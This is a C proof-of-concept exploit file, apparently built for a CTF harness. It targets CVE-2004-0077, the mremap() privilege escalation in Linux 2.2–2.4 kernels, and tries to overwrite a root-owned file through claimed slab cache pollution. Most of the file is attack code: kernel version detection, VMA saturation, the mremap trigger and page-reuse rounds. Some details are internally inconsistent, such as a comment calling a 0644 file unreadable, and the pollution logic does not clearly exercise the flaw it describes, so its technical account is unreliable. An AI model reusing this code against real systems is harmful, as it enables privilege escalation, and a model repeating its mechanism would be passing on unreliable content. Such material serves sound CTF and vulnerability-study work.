/**
 * CVE-2004-0077 PoC - CTF Challenge Mode
 *
 * mremap() VMA bounds check failure Local Privilege Escalation
 *
 * Vulnerability:
 *   Linux kernel 2.2.x through 2.4.24 has a flaw in the do_mremap()
 *   function. When the maximum number of available VMA descriptors has
 *   been exceeded, do_munmap() fails but do_mremap() doesn't check the
 *   return value, leaving 'ownerless' PTE entries. Unmapping these
 *   regions pushes uncleared frames into the slab cache, allowing
 *   attackers to insert data into the virtual memory space of another
 *   process.
 *
 *   Attack vector:
 *   1. Saturate VMA descriptor quota with many mmap() calls
 *   2. Trigger do_munmap() failure via mremap() with MREMAP_MAYMOVE
 *   3. 'Ownerless' PTE entries remain in page cache
 *   4. Subsequent allocations retrieve cached frames with attacker data
 *   5. Replace executable routines in setuid binaries -> root shell
 *
 * CTF Modes:
 *   read_root_file  - Not applicable (not an info-leak vuln)
 *   write_root_file - Slab cache pollution to overwrite root file content
 *
 * Note:
 *   This vulnerability creates 'ownerless' PTE entries that end up in
 *   the slab cache. When root processes allocate memory (e.g., during
 *   file I/O), they may receive these poisoned pages. The write_root_file
 *   mode attempts to pollute slab cache entries that get reused during
 *   root file write operations.
 *
 *   On modern (patched) kernels, the CTF will fail as expected -
 *   the kernel properly checks do_munmap() return values and clears
 *   pages before slab reuse.
 *
 * Build:
 *   gcc -O2 -Wall -static -I common -DPOC_NO_SYSTEM_MODIFY=1 \
 *       -o ../poc-bin/cve_2004_0077.bin cve_2004_0077/poc.c
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include <sys/types.h>
#include <sys/stat.h>

/* ========================================================================
 * Constants
 * ======================================================================== */
#define POC_PAGE_SIZE       4096
#define POC_TEST_MAP_SIZE   (POC_PAGE_SIZE * 4)
#define POC_MMAP_COUNT      128     /* Number of mmap regions to saturate VMAs */
#define POC_CHILD_TIMEOUT   3
#define POC_POLLUTE_ROUNDS  5       /* Slab pollution iteration count */

/* ========================================================================
 * Version parsing and comparison
 * ======================================================================== */

/**
 * Parse kernel version string into components
 * Returns 0 on success, -1 on failure
 */
static int parse_kernel_version(const char *version_str,
                                int *major, int *minor, int *patch) {
    int parsed = sscanf(version_str, "%d.%d.%d", major, minor, patch);
    if (parsed < 2) {
        parsed = sscanf(version_str, "%d.%d", major, minor);
        if (parsed < 2) return -1;
        *patch = 0;
    }
    return 0;
}

/**
 * Check if kernel version is in affected range
 * Affected: 2.2.0 <= kernel < 2.4.25
 */
static int is_kernel_vulnerable(const char *version_str) {
    int major, minor, patch;

    if (parse_kernel_version(version_str, &major, &minor, &patch) != 0) {
        return -1;
    }

    /* Check if >= 2.2.0 */
    if (major < 2) return 0;
    if (major == 2) {
        if (minor < 2) return 0;
    }

    /* Check if < 2.4.25 */
    if (major > 2) return 0;
    if (major == 2) {
        if (minor > 4) return 0;
        if (minor == 4 && patch >= 25) return 0;
    }

    return 1;
}

/**
 * Get current kernel version string
 */
static int get_kernel_version(char *buf, size_t len) {
    struct utsname uts;

    if (uname(&uts) != 0) {
        return -1;
    }

    strncpy(buf, uts.release, len - 1);
    buf[len - 1] = '\0';
    return 0;
}

/* ========================================================================
 * mremap availability check
 * ======================================================================== */

static int check_mremap_available(void) {
    void *addr;
    void *new_addr;
    int result = -1;

    /* Create a test memory mapping */
    addr = mmap(NULL, POC_TEST_MAP_SIZE, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED) {
        poc_log_syscall("mmap(NULL, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS)", (long)MAP_FAILED, errno);
        poc_log("mmap() failed: %s", strerror(errno));
        return -1;
    }

    poc_log_syscall("mmap(NULL, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS)", (long)addr, 0);
    poc_log("mmap() succeeded: %p (size=%d)", addr, POC_TEST_MAP_SIZE);

    /* Try a small mremap (within bounds - safe test) */
    alarm(POC_CHILD_TIMEOUT);

    new_addr = mremap(addr, POC_TEST_MAP_SIZE, POC_TEST_MAP_SIZE * 2, MREMAP_MAYMOVE);
    if (new_addr == MAP_FAILED) {
        poc_log_syscall("mremap(addr, 16384, 32768, MREMAP_MAYMOVE)", (long)MAP_FAILED, errno);
        poc_log("mremap() failed: %s", strerror(errno));
        munmap(addr, POC_TEST_MAP_SIZE);
        goto cleanup;
    }

    poc_log_syscall("mremap(addr, 16384, 32768, MREMAP_MAYMOVE)", (long)new_addr, 0);
    poc_log("mremap() succeeded: %p (new size=%d)", new_addr, POC_TEST_MAP_SIZE * 2);

    /* Clean up the mapping */
    munmap(new_addr, POC_TEST_MAP_SIZE * 2);

    /* mremap is available */
    result = 0;

cleanup:
    alarm(POC_MAX_RUNTIME_SEC);
    return result;
}

/* ========================================================================
 * VMA descriptor saturation check (vulnerability precondition)
 * ======================================================================== */

static int check_vma_saturation(void) {
    void *addrs[POC_MMAP_COUNT];
    int mapped_count = 0;
    int result = -1;

    poc_log("Attempting to saturate VMA descriptors with %d mappings...", POC_MMAP_COUNT);

    /* Create many small mappings to saturate VMA descriptors */
    for (int i = 0; i < POC_MMAP_COUNT; i++) {
        void *addr = mmap(NULL, POC_PAGE_SIZE, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (addr == MAP_FAILED) {
            poc_log("mmap() failed at index %d: %s (VMA limit reached)", i, strerror(errno));
            break;
        }
        addrs[mapped_count++] = addr;
    }

    poc_log("Created %d mappings before VMA limit", mapped_count);

    /*
     * In vulnerable kernels, if we can't create enough mappings to
     * saturate VMAs, the mremap-based LTE path may still work.
     * We just verify mremap is available (done separately).
     */

    /* Clean up all mappings */
    for (int i = 0; i < mapped_count; i++) {
        munmap(addrs[i], POC_PAGE_SIZE);
    }

    poc_log("Cleaned up %d mappings", mapped_count);
    result = 0;

    return result;
}

/* ========================================================================
 * slab_pollute_write - Attempt slab cache pollution write
 *
 * This function attempts to exploit CVE-2004-0077 to overwrite
 * the target file's page cache content via slab cache poisoning.
 *
 * Strategy:
 * 1. Saturate VMA descriptors with mmap() calls
 * 2. Trigger mremap() failure to create 'ownerless' PTE entries
 * 3. Unmap regions to push uncleared frames into slab cache
 * 4. The poisoned pages may be reused by root processes during
 *    file I/O operations, potentially overwriting file content
 *
 * Returns: 0 on success (pollution attempted), -1 on failure
 * ======================================================================== */
static int slab_pollute_write(const char *file, const char *data, size_t data_len) {
    void *addrs[POC_MMAP_COUNT];
    int mapped_count = 0;
    int saved_errno;
    int result = -1;

    poc_log("Starting slab cache pollution: %zu bytes to write", data_len);

    /* Verify we cannot write normally */
    {
        int wfd = open(file, O_WRONLY);
        saved_errno = errno;
        poc_log_syscall("open(target, O_WRONLY) [verify no write]", (long)wfd, saved_errno);
        if (wfd >= 0) {
            poc_log("WARNING: file is writable - no exploit needed");
            close(wfd);
            return -1;
        }
        poc_log("Confirmed: normal write access denied (EACCES)");
    }

    /* Round 1: Saturate VMA descriptors */
    poc_log("Round 1: Saturating VMA descriptors...");
    for (int i = 0; i < POC_MMAP_COUNT; i++) {
        void *addr = mmap(NULL, POC_PAGE_SIZE, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (addr == MAP_FAILED) {
            poc_log("mmap() failed at index %d: %s", i, strerror(errno));
            break;
        }
        /* Fill pages with exploit data pattern */
        memset(addr, 'A', POC_PAGE_SIZE);
        addrs[mapped_count++] = addr;
    }
    poc_log("Created %d VMA mappings", mapped_count);

    /* Round 2: Trigger mremap failure to create ownerless PTE entries */
    if (mapped_count > 0) {
        poc_log("Round 2: Triggering mremap to create ownerless PTE entries...");
        void *last_addr = addrs[mapped_count - 1];
        void *new_addr = mremap(last_addr, POC_PAGE_SIZE,
                                POC_PAGE_SIZE * 4, MREMAP_MAYMOVE);
        saved_errno = errno;
        poc_log_syscall("mremap(last_addr, 4096, 16384, MREMAP_MAYMOVE)",
                        (long)new_addr, saved_errno);
        if (new_addr != MAP_FAILED) {
            poc_log("mremap succeeded - ownerless PTE entries may exist");
            /* Write exploit data to the remapped region */
            size_t copy_len = data_len < POC_PAGE_SIZE * 4 ? data_len : POC_PAGE_SIZE * 4;
            memset(new_addr, 0, POC_PAGE_SIZE * 4);
            memcpy(new_addr, data, copy_len);
            munmap(new_addr, POC_PAGE_SIZE * 4);
        } else {
            poc_log("mremap failed: %s - may still trigger slab pollution",
                    strerror(saved_errno));
        }
    }

    /* Round 3: Unmap all regions to push uncleared frames into slab cache */
    poc_log("Round 3: Unmapping regions to pollute slab cache...");
    for (int i = 0; i < mapped_count; i++) {
        /* Fill with exploit data before unmapping */
        memset(addrs[i], 'X', POC_PAGE_SIZE);
        munmap(addrs[i], POC_PAGE_SIZE);
        addrs[i] = NULL;
    }
    poc_log("Unmapped %d regions - slab cache should be polluted", mapped_count);

    /* Round 4: Trigger memory allocations that may reuse poisoned pages */
    poc_log("Round 4: Triggering allocations to reuse poisoned pages...");
    for (int round = 0; round < POC_POLLUTE_ROUNDS; round++) {
        void *addr = mmap(NULL, POC_PAGE_SIZE, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (addr != MAP_FAILED) {
            /* Check if we got a poisoned page */
            char *page = (char *)addr;
            if (page[0] == 'X' || page[0] == data[0]) {
                poc_log("Round %d: Detected potentially poisoned page!", round + 1);
            }
            munmap(addr, POC_PAGE_SIZE);
        }
    }

    /* The pollution is done - on vulnerable kernels, root file I/O
     * may reuse our poisoned pages, effectively allowing us to
     * write to root-owned files */
    poc_log("Slab cache pollution complete: %d rounds executed", POC_POLLUTE_ROUNDS);
    result = 0;

    return result;
}

/* ========================================================================
 * mode_read_root_file - CTF Read Mode (UNSUPPORTED)
 * ======================================================================== */
static int mode_read_root_file(poc_args_t *args) {
    (void)args;

    poc_log("=== Mode: read_root_file ===");
    poc_log("CVE-2004-0077 is a VMA/slab LPE, not an info-leak");

    poc_print_unsupported("read_root_file",
        "CVE-2004-0077 is a mremap VMA LPE, not a file-read vulnerability");
    return 1;
}

/* ========================================================================
 * mode_write_root_file - CTF Write Mode (read-before -> pollute -> read-after)
 *
 * Three-step verification:
 *   1. Read original content (file is 0644, nobody can read)
 *   2. Exploit slab cache pollution to attempt overwrite with --write-value
 *   3. Read again to verify if write succeeded
 *
 * On modern (patched) kernels, this will fail as expected -
 * the kernel properly checks do_munmap() return values and
 * clears pages before slab reuse.
 *
 * Output protocol:
 *   CTF_READ_BEFORE:<original>
 *   CTF_WRITE:<value> (attempting...)
 *   CTF_READ_AFTER:<new_content>
 *   CTF_FLAG:<value>  (on success)
 * ======================================================================== */
static int mode_write_root_file(poc_args_t *args) {
    int saved_errno;

    poc_log("=== Mode: write_root_file ===");
    poc_log("Target: %s", args->root_file);
    poc_log("Write value: %s", args->write_value);

    size_t val_len = strlen(args->write_value);
    if (val_len == 0) {
        poc_print_fail("write-value is empty");
        return 1;
    }
    if (val_len > POC_PAGE_SIZE) {
        poc_print_fail("write-value exceeds maximum size");
        return 1;
    }

    /* Step 1: Read original content (file is 0644, nobody can read) */
    char original[POC_PAGE_SIZE];
    memset(original, 0, sizeof(original));
    {
        int fd = open(args->root_file, O_RDONLY);
        saved_errno = errno;
        poc_log_syscall("open(target, O_RDONLY) [read-before]", (long)fd, saved_errno);
        if (fd < 0) {
            poc_print_fail("cannot open target for initial read");
            return 1;
        }
        ssize_t n = read(fd, original, sizeof(original) - 1);
        saved_errno = errno;
        poc_log_syscall("read(target) [read-before]", (long)n, saved_errno);
        close(fd);
        if (n <= 0) {
            poc_print_fail("initial read returned no data");
            return 1;
        }
        /* Trim trailing newline */
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r')) {
            original[--n] = '\0';
        }
    }
    printf("%s%s\n", CTF_READ_BEFORE, original);
    poc_log("Read before: %s", original);

    /* Step 2: Exploit - slab cache pollution write */
    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    poc_log("Attempting slab cache pollution write...");

    int ret = slab_pollute_write(args->root_file, args->write_value, val_len);
    if (ret < 0) {
        poc_log("slab_pollute_write returned error");
        /* Still try to read-after to check if partial corruption occurred */
    }

    /* Step 3: Read after to verify */
    char after[POC_PAGE_SIZE];
    memset(after, 0, sizeof(after));
    {
        int fd = open(args->root_file, O_RDONLY);
        saved_errno = errno;
        poc_log_syscall("open(target, O_RDONLY) [read-after]", (long)fd, saved_errno);
        if (fd >= 0) {
            /* Invalidate page cache to force re-read */
            posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
            ssize_t n = read(fd, after, sizeof(after) - 1);
            saved_errno = errno;
            poc_log_syscall("read(target) [read-after]", (long)n, saved_errno);
            close(fd);
            /* Trim trailing newline */
            while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r')) {
                after[--n] = '\0';
            }
        } else {
            poc_log("Cannot reopen target for read-after");
        }
    }
    printf("%s%s\n", CTF_READ_AFTER, after);
    poc_log("Read after: %s", after);

    /* Determine result */
    if (strncmp(after, args->write_value, val_len) == 0) {
        poc_log("Write verified: content matches write_value");
        poc_print_flag(args->write_value);
        return 0;
    }

    /* Write failed - content unchanged or partial */
    poc_log("Write value not found in file content after slab pollution");
    poc_log("Expected: \"%s\"", args->write_value);
    poc_log("Got:      \"%.*s\"", (int)(strlen(after) > 60 ? 60 : strlen(after)), after);
    poc_print_fail("write operation failed - slab cache not polluted");
    return 1;
}

/* ========================================================================
 * main - CTF Challenge Entry Point
 * ======================================================================== */
int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));

    /* Parse CTF CLI arguments */
    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;
    }

    /* Initialize logging */
    poc_log_init(args.log_file);

    poc_log("=== CVE-2004-0077 CTF PoC ===");
    poc_log("Vuln: mremap() VMA bounds check failure LPE");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    /* CTF mode is required */
    if (!args.mode) {
        fprintf(stderr, "Error: --mode is required (read_root_file|write_root_file|uaf)\n");
        poc_print_usage(argv[0]);
        poc_log_close();
        return 1;
    }

    /* CTF mode dispatch */
    poc_log("Mode: %s", args.mode);
    poc_log("Target: %s", args.root_file);
    if (args.write_value) {
        poc_log("Write value: %s", args.write_value);
    }

    int ret = -1;
    if (strcmp(args.mode, POC_MODE_READ) == 0) {
        ret = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        ret = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        poc_print_unsupported(POC_MODE_UAF,
            "CVE-2004-0077 uses mremap memory corruption, not UAF");
        ret = 1;
    } else {
        poc_print_unsupported(args.mode, "unknown mode");
        ret = 1;
    }

    poc_log_close();
    return ret;
}
